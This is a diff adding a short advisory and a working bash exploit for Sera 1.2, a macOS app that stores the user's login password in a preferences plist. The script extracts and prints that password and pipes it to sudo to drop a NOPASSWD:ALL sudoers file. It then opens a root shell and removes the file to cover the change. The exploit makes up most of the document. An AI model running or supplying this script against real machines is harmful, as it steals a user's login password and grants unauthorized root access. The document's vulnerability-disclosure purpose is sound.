@@ -1,0 +1,46 @@
+# Sera is a free app for mac and iOS that lets you unlock your mac automatically
+# when your iphone is within a configured proximity.
+
+# Unfortunately to facilitate this it stores the users login password in their
+# home directory at:
+
+# ~/Library/Preferences/no.ignitum.SeraOSX.plist
+
+# This makes root privilege escalation trivial and worse than that even
+# facilitates dumping the keychain as we can easily obtain the user's login
+# password. If they are an admin user we can even dump items from the system
+# keychain.
+
+# The author of Sera has said he will shut the project down and make the code
+# publicly available so no fix is likely to be forthcoming anytime soon.
+
+# It is strongly recommended not to use this app and if you have done so in the
+# past make sure you remove this file that contains your login password.
+
+# https://m4.rkw.io/sera_1.2.sh.txt
+# dbf4f7b64cac8a60a2c7b3ba2a3988b84a148a3f6e31bcb58d4554e5e74d8edf
+# -------------------------------------------------------------------------
+#!/bin/bash
+
+##############################################################
+###### sera 1.2 local root privilege escalation exploit ######
+###### by m4rkw - https://m4.rkw.io/blog.html           ######
+##############################################################
+
+sera_pass=`plutil -p ~/Library/Preferences/no.ignitum.SeraOSX.plist |grep '"sera_pass"' |cut -d '"' -f4`
+
+if [ "$sera_pass" == "" ] ; then
+  echo "Password not found."
+  exit 1
+fi
+
+echo "user's password is: $sera_pass"
+
+user="`whoami`"
+
+echo "$user ALL=(ALL) NOPASSWD:ALL" > /tmp/sera_12_exp
+
+echo "$sera_pass" | sudo -S chown root:wheel /tmp/sera_12_exp 1>/dev/null 2>/dev/null
+echo "$sera_pass" | sudo -S mv /tmp/sera_12_exp /etc/sudoers.d/sera_12_exp 1>/dev/null 2>/dev/null
+
+sudo bash -c 'rm -f /etc/sudoers.d/sera_12_exp; /bin/bash'
